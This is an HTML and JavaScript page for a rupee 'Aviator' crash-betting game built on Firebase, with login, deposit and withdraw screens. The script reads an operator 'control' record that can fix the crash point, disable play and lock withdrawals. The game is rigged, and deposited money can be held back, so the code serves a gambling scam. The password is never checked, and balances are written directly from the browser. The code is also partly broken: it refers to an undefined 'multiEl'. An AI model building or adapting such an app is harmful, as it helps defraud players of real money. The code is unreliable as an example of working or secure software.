<!DOCTYPE html>
<html>
<head>
<title>Aviator Control</title>

<style>
body { background:#111; color:#fff; text-align:center; font-family:sans-serif; }
input, button { padding:10px; margin:5px; border:none; border-radius:5px; }
button { background:#00c853; color:#fff; }
.page { display:none; }
</style>

</head>
<body>

<!-- LOGIN -->
<div id="login" class="page" style="display:block;">
  <h2>Aviator ✈️</h2>
  <input id="mobile" placeholder="Mobile"><br>
  <input id="pass" placeholder="Password" type="password"><br>
  <button onclick="login()">Login</button>
</div>

<!-- GAME -->
<div id="game" class="page">
  <h3>Balance: ₹<span id="bal">0</span></h3>

  <h1 id="multi">1.00x</h1>

  <input id="bet" placeholder="Bet"><br>
  <button onclick="startGame()">Start</button>
  <button onclick="cashout()">Cashout</button><br>

  <button onclick="showPage('deposit')">Deposit</button>
  <button onclick="showPage('withdraw')">Withdraw</button>

  <h3 id="status"></h3>
</div>

<!-- DEPOSIT -->
<div id="deposit" class="page">
  <h3>Deposit</h3>
  <input id="damount" placeholder="Amount"><br>
  <button onclick="deposit()">Submit</button><br>
  <button onclick="back()">Back</button>
</div>

<!-- WITHDRAW -->
<div id="withdraw" class="page">
  <h3>Withdraw</h3>
  <input id="wamount" placeholder="Amount"><br>
  <button onclick="withdraw()">Submit</button><br>
  <button onclick="back()">Back</button>
</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-app.js";
import { getDatabase, ref, set, get, update, push } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-database.js";

const app = initializeApp({
  apiKey: "AIzaSyDCYEveGXPy1nORiyyeyIjsbfcqEy4iaVg",
  authDomain: "avaitior-game.firebaseapp.com",
  databaseURL: "https://avaitior-game-default-rtdb.firebaseio.com",
  projectId: "avaitior-game"
});

const db = getDatabase(app);

let user = "";
let balance = 0;
let running = false;
let multi = 1;
let crash = 2;
let betAmt = 0;

// PAGE
window.showPage = (p)=>{
  document.querySelectorAll('.page').forEach(x=>x.style.display='none');
  document.getElementById(p).style.display='block';
};
window.back = ()=> showPage('game');

// LOGIN
window.login = async ()=>{
  user = mobile.value;

  let snap = await get(ref(db,"users/"+user));

  if(!snap.exists()){
    balance = 100;
    await set(ref(db,"users/"+user),{balance});
  } else {
    balance = snap.val().balance || 0;
  }

  bal.innerText = balance;
  showPage("game");
};

// GAME START
window.startGame = async ()=>{
  if(running) return;

  betAmt = Number(bet.value);
  if(betAmt<=0 || betAmt>balance) return alert("Invalid Bet");

  // 🔥 CONTROL FETCH
  let snap = await get(ref(db,"control"));
  let data = snap.val() || {};

  // demo lock
  if(data.demoLock){
    return alert("Demo Disabled");
  }

  // crash control
  crash = data.crashPoint || (Math.random()*5+1);

  balance -= betAmt;
  bal.innerText = balance;

  running = true;
  multi = 1;

  let int = setInterval(()=>{
    if(!running) return;

    multi += 0.1;
    multiEl.innerText = multi.toFixed(2)+"x";

    if(multi >= crash){
      running = false;
      clearInterval(int);
      status.innerText = "💥 Crashed";
      save();
    }

  },200);
};

// CASHOUT
window.cashout = ()=>{
  if(!running) return;

  let win = betAmt * multi;
  balance += Math.floor(win);

  bal.innerText = balance;
  running = false;
  status.innerText = "✅ Cashed Out";

  save();
};

// SAVE
function save(){
  update(ref(db,"users/"+user),{balance});
}

// DEPOSIT
window.deposit = ()=>{
  let amt = damount.value;

  push(ref(db,"deposits"),{
    user, amount:amt, status:"pending"
  });

  alert("Deposit Request Sent");
};

// WITHDRAW
window.withdraw = async ()=>{
  let amt = wamount.value;

  let snap = await get(ref(db,"control"));
  let data = snap.val() || {};

  // withdraw lock
  if(data.withdrawLock){
    return alert("Withdraw Disabled");
  }

  push(ref(db,"withdraw"),{
    user, amount:amt, status:"pending"
  });

  alert("Withdraw Request Sent");
};

</script>

</body>
</html>
